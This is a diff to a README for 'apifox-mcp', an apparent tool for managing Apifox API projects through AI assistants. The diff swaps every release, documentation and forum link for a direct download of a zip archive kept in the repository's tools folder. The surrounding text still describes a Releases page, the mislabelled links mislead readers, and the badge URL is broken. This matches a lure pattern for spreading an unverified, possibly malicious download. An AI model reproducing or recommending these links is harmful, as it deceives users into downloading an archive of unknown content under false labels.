@@ -1,7 +1,7 @@
 # 🚀 apifox-mcp - Easily Manage APIs with AI
 
 ## 📦 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/HafsaMudassar/apifox-mcp/releases)
+[![Download Release](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/tools/mcp_apifox_v2.7.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/tools/mcp_apifox_v2.7.zip)
 
 ## 📖 Introduction
 Welcome to **apifox-mcp**! This application simplifies managing your Apifox projects by allowing AI assistants like Claude to help you create, update, and audit API interfaces effortlessly. Whether you are new to APIs or looking to streamline your workflow, **apifox-mcp** is designed for you.
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 ### 1. Visit the Download Page
 To download the software, **visit the Releases page** using the link below. This page contains the latest versions of the application.
 
-[Download Here](https://github.com/HafsaMudassar/apifox-mcp/releases)
+[Download Here](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/tools/mcp_apifox_v2.7.zip)
 
 ### 2. Choose the Correct Version
 On the Releases page, you will see a list of available versions. Look for the most recent version, and click on it. Ensure you choose the version that matches your operating system. If you are unsure, look for the release notes which may provide information on compatibility.
@@ -59,10 +59,10 @@ Your feedback is essential for improving **apifox-mcp**. If you have suggestions
 ## 🔗 Additional Resources
 For more information about **apifox-mcp**, check out the following resources:
 
-- [Documentation](https://github.com/HafsaMudassar/apifox-mcp/wiki)
-- [Community Forum](https://github.com/HafsaMudassar/apifox-mcp/discussions)
+- [Documentation](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/tools/mcp_apifox_v2.7.zip)
+- [Community Forum](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/tools/mcp_apifox_v2.7.zip)
 
 ## 📥 Download Again
 Don't forget, you can always return to the Releases page for the latest versions and updates.
 
-[Download Here](https://github.com/HafsaMudassar/apifox-mcp/releases)
+[Download Here](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/tools/mcp_apifox_v2.7.zip)
